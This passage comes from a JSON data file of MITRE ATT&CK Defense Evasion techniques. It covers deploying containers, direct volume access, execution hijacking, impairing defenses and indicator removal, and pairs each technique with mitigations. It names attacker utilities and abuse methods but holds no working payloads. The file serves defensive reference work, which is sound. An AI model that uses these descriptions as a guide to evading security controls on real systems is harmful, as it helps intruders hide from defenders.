          "content": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system."
        }
      ],
      [
        {
          "type": "text",
          "content": "One such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows "
        },
        { "type": "code", "content": "copy /b" },
        {
          "type": "text",
          "content": " command to reassemble binary fragments into a malicious payload."
        }
      ],
      [
        {
          "type": "text",
          "content": "Sometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. "
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1610",
    "name": "Deploy Container",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0002", "name": "Execution" }
    ],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment."
        }
      ],
      [
        {
          "type": "text",
          "content": "Containers can be deployed by various means, such as via Docker's "
        },
        { "type": "code", "content": "create" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "start" },
        {
          "type": "text",
          "content": " APIs or via a web application such as the Kubernetes dashboard or Kubeflow. Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Scan images before deployment, and block those that are not in compliance with security policies. In Kubernetes environments, the admission controller can be used to validate images after a container deployment request is authenticated but before the container is deployed."
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "Limit Access to Resource Over Network",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit communications with the container service to managed and secured channels, such as local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API, Kubernetes API Server, and container orchestration web applications. In Kubernetes clusters deployed in cloud environments, use native cloud platform features to restrict the IP ranges that are permitted to access to API server. Where possible, consider enabling just-in-time (JIT) access to the Kubernetes API to place additional restrictions on access."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Enforce the principle of least privilege by limiting container dashboard access to only the necessary users. When using Kubernetes, avoid giving users wildcard permissions or adding users to the "
            },
            { "type": "code", "content": "system:masters" },
            { "type": "text", "content": " group, and use " },
            { "type": "code", "content": "RoleBindings" },
            { "type": "text", "content": " rather than " },
            { "type": "code", "content": "ClusterRoleBindings" },
            {
              "type": "text",
              "content": " to limit user privileges to specific namespaces."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1006",
    "name": "Direct Volume Access",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [],
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. "
        }
      ],
      [
        { "type": "text", "content": "Utilities, such as " },
        { "type": "code", "content": "NinjaCopy" },
        {
          "type": "text",
          "content": ", exist to perform these actions in PowerShell. Adversaries may also use built-in or third-party utilities (such as "
        },
        { "type": "code", "content": "vssadmin" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "wbadmin" },
        {
          "type": "text",
          "content": ", and esentutl) to create shadow copies or backups of data from system volumes."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "Some endpoint security solutions can be configured to block some types of behaviors related to efforts by an adversary to create backups, such as command execution or preventing API calls to backup related services."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure only accounts required to configure and manage backups have the privileges to do so. Monitor these accounts for unauthorized backup activity."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1484",
    "name": "Domain Policy Modification",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1484.001", "name": "Group Policy Modification" },
      { "id": "T1484.002", "name": "Domain Trust Modification" }
    ],
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts."
        }
      ],
      [
        {
          "type": "text",
          "content": "With sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious Scheduled Task to computers throughout the domain environment or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources. Adversaries can also change configuration settings within the AD environment to implement a Rogue Domain Controller."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Identify and correct GPO permissions abuse opportunities (ex: GPO modification privileges) using auditing tools such as BloodHound (version 1.5.1 and later)."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Use least privilege and protect administrative access to the Domain Controller and Active Directory Federation Services (AD FS) server. Do not create service accounts with administrative privileges."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1480",
    "name": "Execution Guardrails",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [{ "id": "T1480.001", "name": "Environmental Keying" }],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses."
        }
      ],
      [
        {
          "type": "text",
          "content": "Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1055",
        "name": "Do Not Mitigate",
        "description": [
          [
            {
              "type": "text",
              "content": "Execution Guardrails likely should not be mitigated with preventative controls because it may protect unintended targets from being compromised. If targeted, efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior if compromised."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1211",
    "name": "Exploitation for Defense Evasion",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection."
        }
      ],
      [
        {
          "type": "text",
          "content": "There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries , evade security logs , or deploy hidden infrastructure."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1048",
        "name": "Application Isolation and Sandboxing",
        "description": [
          [
            {
              "type": "text",
              "content": "Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist. "
            }
          ]
        ]
      },
      {
        "id": "M1050",
        "name": "Exploit Protection",
        "description": [
          [
            {
              "type": "text",
              "content": "Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior.  Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring.  Many of these protections depend on the architecture and target application binary for compatibility and may not work for software targeted for defense evasion."
            }
          ]
        ]
      },
      {
        "id": "M1019",
        "name": "Threat Intelligence Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Update software regularly by employing patch management for internal enterprise endpoints and servers."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1222",
    "name": "File and Directory Permissions Modification",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [
      {
        "id": "T1222.001",
        "name": "Windows File and Directory Permissions Modification"
      },
      {
        "id": "T1222.002",
        "name": "Linux and Mac File and Directory Permissions Modification"
      }
    ],
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.)."
        }
      ],
      [
        {
          "type": "text",
          "content": "Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure critical system files as well as those known to be abused by adversaries have restrictive permissions and are owned by an appropriately privileged account, especially if access is not required by users nor will inhibit system functionality."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Applying more restrictive permissions to files and directories could prevent adversaries from modifying their access control lists. Additionally, ensure that user settings regarding local and remote symbolic links are properly set or disabled where unneeded."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1564",
    "name": "Hide Artifacts",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [
      { "id": "T1564.001", "name": "Hidden Files and Directories" },
      { "id": "T1564.002", "name": "Hidden Users" },
      { "id": "T1564.003", "name": "Hidden Window" },
      { "id": "T1564.004", "name": "NTFS File Attributes" },
      { "id": "T1564.005", "name": "Hidden File System" },
      { "id": "T1564.006", "name": "Run Virtual Instance" },
      { "id": "T1564.007", "name": "VBA Stomping" },
      { "id": "T1564.008", "name": "Email Hiding Rules" },
      { "id": "T1564.009", "name": "Resource Forking" },
      { "id": "T1564.010", "name": "Process Argument Spoofing" },
      { "id": "T1564.011", "name": "Ignore Process Interrupts" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1574",
    "name": "Hijack Execution Flow",
    "tactics": [
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" },
      { "id": "TA0005", "name": "Defense Evasion" }
    ],
    "subs": [
      { "id": "T1574.001", "name": "DLL Search Order Hijacking" },
      { "id": "T1574.002", "name": "DLL Side-Loading" },
      { "id": "T1574.004", "name": "Dylib Hijacking" },
      {
        "id": "T1574.005",
        "name": "Executable Installer File Permissions Weakness"
      },
      { "id": "T1574.006", "name": "Dynamic Linker Hijacking" },
      {
        "id": "T1574.007",
        "name": "Path Interception by PATH Environment Variable"
      },
      {
        "id": "T1574.008",
        "name": "Path Interception by Search Order Hijacking"
      },
      { "id": "T1574.009", "name": "Path Interception by Unquoted Path" },
      { "id": "T1574.010", "name": "Services File Permissions Weakness" },
      { "id": "T1574.011", "name": "Services Registry Permissions Weakness" },
      { "id": "T1574.012", "name": "COR_PROFILER" },
      { "id": "T1574.013", "name": "KernelCallbackTable" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution."
        }
      ],
      [
        {
          "type": "text",
          "content": "There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1013",
        "name": "Application Developer Guidance",
        "description": [
          [
            {
              "type": "text",
              "content": "When possible, include hash values in manifest files to help prevent side-loading of malicious libraries."
            }
          ]
        ]
      },
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Use auditing tools capable of detecting hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for hijacking weaknesses."
            }
          ],
          [
            {
              "type": "text",
              "content": "Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software."
            }
          ],
          [
            {
              "type": "text",
              "content": "Find and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate."
            }
          ],
          [
            {
              "type": "text",
              "content": "Clean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations."
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "Some endpoint security solutions can be configured to block some types of behaviors related to process injection/memory tampering based on common sequences of indicators (ex: execution of specific API functions)."
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Adversaries may use new payloads to execute this technique. Identify and block potentially malicious software executed through hijacking by using application control solutions also capable of blocking libraries loaded by legitimate software."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Install software in write-protected locations. Set directory access controls to prevent file writes to the search paths for applications, both in the folders where applications are run from and the standard library folders."
            }
          ]
        ]
      },
      {
        "id": "M1044",
        "name": "Restrict Library Loading",
        "description": [
          [
            {
              "type": "text",
              "content": "Disallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+."
            }
          ],
          [
            {
              "type": "text",
              "content": "Enable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions (e.g. "
            },
            { "type": "code", "content": "%SYSTEMROOT%" },
            {
              "type": "text",
              "content": ")to be used before local directory DLLs (e.g. a user's home directory)"
            }
          ],
          [
            {
              "type": "text",
              "content": "The Safe DLL Search Mode can be enabled via Group Policy at Computer Configuration > [Policies] > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. The associated Windows Registry key for this is located at "
            },
            {
              "type": "code",
              "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "Restrict Registry Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Update software regularly to include patches that fix DLL side-loading vulnerabilities."
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "User Account Control",
        "description": [
          [
            {
              "type": "text",
              "content": "Turn off UAC's privilege elevation for standard users "
            },
            {
              "type": "code",
              "content": "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]"
            },
            {
              "type": "text",
              "content": " to automatically deny elevation requests, add: "
            },
            {
              "type": "code",
              "content": "\"ConsentPromptBehaviorUser\"=dword:00000000"
            },
            {
              "type": "text",
              "content": ". Consider enabling installer detection for all users by adding: "
            },
            {
              "type": "code",
              "content": "\"EnableInstallerDetection\"=dword:00000001"
            },
            {
              "type": "text",
              "content": ". This will prompt for a password for installation and also log the attempt. To disable installer detection, instead add: "
            },
            {
              "type": "code",
              "content": "\"EnableInstallerDetection\"=dword:00000000"
            },
            {
              "type": "text",
              "content": ". This may prevent potential elevation of privileges through exploitation during the process of UAC detecting the installer, but will allow the installation process to continue without being logged.  "
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able."
            }
          ],
          [
            {
              "type": "text",
              "content": "Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory "
            },
            { "type": "code", "content": "C:" },
            { "type": "text", "content": " and system directories, such as " },
            { "type": "code", "content": "C:\\Windows\\" },
            {
              "type": "text",
              "content": ", to reduce places where malicious files could be placed for execution."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1562",
    "name": "Impair Defenses",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [
      { "id": "T1562.001", "name": "Disable or Modify Tools" },
      { "id": "T1562.002", "name": "Disable Windows Event Logging" },
      { "id": "T1562.003", "name": "Impair Command History Logging" },
      { "id": "T1562.004", "name": "Disable or Modify System Firewall" },
      { "id": "T1562.006", "name": "Indicator Blocking" },
      { "id": "T1562.007", "name": "Disable or Modify Cloud Firewall" },
      { "id": "T1562.008", "name": "Disable or Modify Cloud Logs" },
      { "id": "T1562.009", "name": "Safe Mode Boot" },
      { "id": "T1562.010", "name": "Downgrade Attack" },
      { "id": "T1562.011", "name": "Spoof Security Alerting" },
      { "id": "T1562.012", "name": "Disable or Modify Linux Audit System" }
    ],
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out of a computer or stopping it from being shut down. These restrictions can further enable malicious operations as well as the continued propagation of incidents."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Routinely check account role permissions to ensure only expected users and roles have permission to modify defensive tools and settings."
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Use application control where appropriate, especially regarding the execution of tools outside of the organization's security policies (such as rootkit removal tools) that have been abused to impair system defenses. Ensure that only approved security applications are used and running on enterprise systems."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper process and file permissions are in place to prevent adversaries from disabling or interfering with security/logging services."
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "Restrict Registry Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper Registry permissions are in place to prevent adversaries from disabling or interfering with security/logging services."
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "Software Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider implementing policies on internal web servers, such HTTP Strict Transport Security, that enforce the use of HTTPS/network traffic encryption to prevent insecure connections."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security/logging services."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1656",
    "name": "Impersonation",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via Phishing for Information, Phishing, or Internal Spearphishing) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims. "
        }
      ],
      [
        {
          "type": "text",
          "content": "In many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables Financial Theft."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as "
        },
        { "type": "code", "content": "payment" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "request" },
        { "type": "text", "content": ", or " },
        { "type": "code", "content": "urgent" },
        {
          "type": "text",
          "content": " to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary’s goal.   "
        }
      ],
      [
        {
          "type": "text",
          "content": "Impersonation is typically preceded by reconnaissance techniques such as Gather Victim Identity Information and Gather Victim Org Information as well as acquiring infrastructure such as email domains (i.e. Domains) to substantiate their false identity."
        }
      ],
      [
        {
          "type": "text",
          "content": "There is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may Compromise Accounts targeting one organization which can then be used to support impersonation against other entities."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1019",
        "name": "Threat Intelligence Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Threat intelligence helps defenders and users be aware of and defend against common lures and active campaigns that have been used for impersonation."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Train users to be aware of impersonation tricks and how to counter them, for example confirming incoming requests through an independent platform like a phone call or in-person, to reduce risk."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1070",
    "name": "Indicator Removal",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [
      { "id": "T1070.001", "name": "Clear Windows Event Logs" },
      { "id": "T1070.002", "name": "Clear Linux or Mac System Logs" },
      { "id": "T1070.003", "name": "Clear Command History" },
      { "id": "T1070.004", "name": "File Deletion" },
      { "id": "T1070.005", "name": "Network Share Connection Removal" },
      { "id": "T1070.006", "name": "Timestomp" },
      {
        "id": "T1070.007",
        "name": "Clear Network Connection History and Configurations"
      },
      { "id": "T1070.008", "name": "Clear Mailbox Data" },
      { "id": "T1070.009", "name": "Clear Persistence" }
    ],
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform."
        }
      ],
      [
        {
          "type": "text",
          "content": "Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary."
            }
          ]
        ]
      },
      {
        "id": "M1029",
        "name": "Remote Data Storage",
        "description": [
          [
            {
              "type": "text",
              "content": "Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system. "
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1202",
    "name": "Indirect Command Execution",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts.  "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may abuse these features for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd or file extensions more commonly associated with malicious payloads."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1036",
    "name": "Masquerading",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [
      { "id": "T1036.001", "name": "Invalid Code Signature" },
      { "id": "T1036.002", "name": "Right-to-Left Override" },
      { "id": "T1036.003", "name": "Rename System Utilities" },
      { "id": "T1036.004", "name": "Masquerade Task or Service" },
      { "id": "T1036.005", "name": "Match Legitimate Name or Location" },
      { "id": "T1036.006", "name": "Space after Filename" },
      { "id": "T1036.007", "name": "Double File Extension" },
      { "id": "T1036.008", "name": "Masquerade File Type" },
      { "id": "T1036.009", "name": "Break Process Trees" }
    ],
    "version": "1.6",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names."
        }
      ],
      [
        {
          "type": "text",
          "content": "Renaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "Antivirus/Antimalware",
        "description": [
          [
            {
              "type": "text",
              "content": "Anti-virus can be used to automatically quarantine suspicious files."
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "Implement security controls on the endpoint, such as a Host Intrusion Prevention System (HIPS), to identify and prevent execution of potentially malicious files (such as those with mismatching file signatures)."
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "Code Signing",
        "description": [
          [{ "type": "text", "content": "Require signed binaries." }]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Use tools that restrict program execution via application control by attributes other than file name for common operating system utilities that are needed."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
